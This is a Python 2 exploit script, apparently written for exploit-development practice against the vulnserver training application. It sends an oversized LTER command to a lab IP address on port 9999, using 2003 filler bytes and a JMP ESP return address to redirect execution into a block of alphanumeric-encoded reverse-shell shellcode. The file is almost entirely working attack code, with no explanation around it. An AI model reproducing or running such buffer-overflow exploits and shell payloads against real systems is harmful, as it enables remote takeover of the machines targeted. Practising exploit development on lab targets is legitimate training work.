import socket
import struct
import time
import binascii

print "\nLTER Command - Exploit, JMP ESP\n"

ip_addr = '192.168.199.130'
port = 9999

revshell = (
"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c\x38\x68\x6d\x52\x77\x70"
"\x57\x70\x67\x70\x35\x30\x6e\x69\x49\x75\x54\x71\x69\x50\x71"
"\x74\x4e\x6b\x50\x50\x66\x50\x6c\x4b\x50\x52\x36\x6c\x4e\x6b"
"\x72\x72\x77\x64\x6c\x4b\x73\x42\x65\x78\x44\x4f\x38\x37\x33"
"\x7a\x34\x66\x44\x71\x49\x6f\x4c\x6c\x65\x6c\x70\x61\x31\x6c"
"\x46\x62\x66\x4c\x51\x30\x4b\x71\x6a\x6f\x76\x6d\x76\x61\x6b"
"\x77\x5a\x42\x4c\x32\x72\x72\x63\x67\x4e\x6b\x62\x72\x44\x50"
"\x6e\x6b\x61\x5a\x47\x4c\x6e\x6b\x62\x6c\x37\x61\x64\x38\x49"
"\x73\x37\x38\x67\x71\x6b\x61\x32\x71\x6e\x6b\x42\x79\x61\x30"
"\x46\x61\x5a\x73\x4c\x4b\x72\x69\x35\x48\x48\x63\x44\x7a\x53"
"\x79\x4e\x6b\x34\x74\x6e\x6b\x77\x71\x58\x56\x66\x51\x79\x6f"
"\x6e\x4c\x4f\x31\x48\x4f\x46\x6d\x55\x51\x5a\x67\x35\x68\x6d"
"\x30\x61\x65\x4c\x36\x77\x73\x31\x6d\x49\x68\x35\x6b\x33\x4d"
"\x75\x74\x63\x45\x79\x74\x32\x78\x4c\x4b\x42\x78\x34\x64\x73"
"\x31\x78\x53\x53\x56\x4e\x6b\x76\x6c\x70\x4b\x4c\x4b\x53\x68"
"\x47\x6c\x37\x71\x59\x43\x4e\x6b\x47\x74\x4c\x4b\x37\x71\x7a"
"\x70\x6c\x49\x50\x44\x77\x54\x35\x74\x61\x4b\x43\x6b\x70\x61"
"\x71\x49\x53\x6a\x73\x61\x6b\x4f\x69\x70\x61\x4f\x53\x6f\x61"
"\x4a\x6e\x6b\x44\x52\x38\x6b\x4e\x6d\x53\x6d\x55\x38\x70\x33"
"\x35\x62\x33\x30\x63\x30\x53\x58\x44\x37\x71\x63\x47\x42\x61"
"\x4f\x46\x34\x71\x78\x50\x4c\x63\x47\x47\x56\x73\x37\x39\x6f"
"\x68\x55\x4d\x68\x5a\x30\x66\x61\x37\x70\x63\x30\x56\x49\x38"
"\x44\x61\x44\x42\x70\x61\x78\x64\x69\x6f\x70\x30\x6b\x53\x30"
"\x39\x6f\x59\x45\x50\x50\x46\x30\x66\x30\x70\x50\x33\x70\x50"
"\x50\x63\x70\x42\x70\x62\x48\x38\x6a\x64\x4f\x59\x4f\x4d\x30"
"\x59\x6f\x4a\x75\x4d\x47\x72\x4a\x37\x75\x73\x58\x6b\x70\x6c"
"\x68\x48\x47\x4b\x30\x52\x48\x67\x72\x75\x50\x37\x61\x53\x6c"
"\x4f\x79\x4b\x56\x43\x5a\x64\x50\x30\x56\x32\x77\x62\x48\x6c"
"\x59\x69\x35\x33\x44\x61\x71\x69\x6f\x39\x45\x6d\x55\x6b\x70"
"\x71\x64\x44\x4c\x39\x6f\x70\x4e\x63\x38\x32\x55\x4a\x4c\x50"
"\x68\x6c\x30\x6d\x65\x4e\x42\x51\x46\x49\x6f\x79\x45\x53\x58"
"\x50\x63\x32\x4d\x52\x44\x67\x70\x4f\x79\x4d\x33\x73\x67\x73"
"\x67\x52\x77\x74\x71\x38\x76\x63\x5a\x42\x32\x62\x79\x61\x46"
"\x58\x62\x59\x6d\x70\x66\x38\x47\x31\x54\x47\x54\x75\x6c\x46"
"\x61\x43\x31\x6c\x4d\x72\x64\x45\x74\x72\x30\x4b\x76\x43\x30"
"\x42\x64\x56\x34\x52\x70\x76\x36\x70\x56\x43\x66\x47\x36\x51"
"\x46\x62\x6e\x73\x66\x32\x76\x30\x53\x72\x76\x32\x48\x73\x49"
"\x48\x4c\x67\x4f\x6c\x46\x39\x6f\x79\x45\x4d\x59\x69\x70\x62"
"\x6e\x30\x56\x63\x76\x79\x6f\x30\x30\x42\x48\x74\x48\x4e\x67"
"\x55\x4d\x43\x50\x69\x6f\x6a\x75\x6f\x4b\x6c\x30\x38\x35\x6d"
"\x72\x46\x36\x65\x38\x59\x36\x6d\x45\x6d\x6d\x4d\x4d\x69\x6f"
"\x68\x55\x35\x6c\x67\x76\x73\x4c\x75\x5a\x4b\x30\x49\x6b\x49"
"\x70\x54\x35\x75\x55\x6d\x6b\x61\x57\x77\x63\x62\x52\x72\x4f"
"\x61\x7a\x45\x50\x51\x43\x39\x6f\x4a\x75\x41\x41"
)

# send evil buffer to vulnserver
def send_evil_buffer(evil_buffer):

    did_send = False

    command = evil_buffer[:5]

    print "Sending buffer of length %s to command %s" % (len(evil_buffer), command)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        s.connect((ip_addr, int(port)))

    except Exception as e:
        print "[-] Failed to connect to service %s" % e

    else:
        print "[+] Connected to server"

        # Get banner response
        data = s.recv(1024)
        print(data)

        bytes_sent = s.send(evil_buffer)
        print "Sent %s bytes" % bytes_sent

        if bytes_sent > 0:
            did_send = True

    finally:
        s.close()
 
    return did_send

###############################################################################

# Jump ESP
jmp_esp = struct.pack("<I", 0x62501203)
evil_buffer = "LTER /.:/" + 'A'*2003 + jmp_esp + revshell + 'C'*(3000-2003-4-len(revshell)) 

send_evil_buffer(evil_buffer)
